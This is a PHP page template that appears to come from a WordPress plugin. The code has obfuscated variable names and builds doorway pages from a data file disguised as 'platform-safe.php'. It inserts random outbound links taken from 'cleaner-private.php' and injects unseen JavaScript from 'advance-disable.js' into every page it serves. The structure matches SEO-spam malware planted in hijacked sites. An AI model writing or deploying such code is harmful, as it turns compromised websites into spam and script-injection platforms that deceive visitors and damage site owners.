<?php
$b8u3XDjsE = intval(get_query_var('dsjuc'));

if ($b8u3XDjsE < 1 || $b8u3XDjsE > 4308) return;
$td3HUa5UGg = file(plugin_dir_path(__FILE__).'platform-safe.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$zqZVYYPt4 = explode(';', $td3HUa5UGg[$b8u3XDjsE]);
if (count($zqZVYYPt4) < 2) return;
$p8QOwAdP0a = $zqZVYYPt4[0];
$zUllTGag  = $zqZVYYPt4[1];
$m60llI = $zqZVYYPt4[2];
$hdKwZe7  = $zqZVYYPt4[3];
$bCg54 = $zqZVYYPt4[4];
set_query_var('xwtwb', $p8QOwAdP0a);

$byloFrxj = '';
$gaUrJ = plugin_dir_path(__FILE__).'cleaner-private.php';
if (is_file($gaUrJ)) {
	$l9BJi = file($gaUrJ, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($l9BJi);
	shuffle($l9BJi);
	$k6TzmMcH2 = mt_rand(2, 5);
	if (count($l9BJi) > $k6TzmMcH2) {
		for ($a9iqN = 0; $a9iqN < $k6TzmMcH2; $a9iqN++) {
			$dHUdEAaO = array_shift($l9BJi);
			$byloFrxj .= '<p><a href="'.$dHUdEAaO.'">'.$dHUdEAaO.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $p8QOwAdP0a; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $zUllTGag . "</p>\n";
				if (strlen($hdKwZe7) > 0) echo "<p>" . $hdKwZe7 . "</p>\n";
				if (strlen($m60llI) > 0) echo "<p>" . $m60llI . "</p>\n";
				if (strlen($bCg54) > 0) echo '<p><a href="#"><img src="'.$bCg54.'"></a>' . "</p>\n";
				echo $byloFrxj;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$pDT0fUYK = plugin_dir_path(__FILE__) . 'advance-disable.js';
if (is_file($pDT0fUYK)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($pDT0fUYK);
	echo '</script>';
}
get_footer();
?>
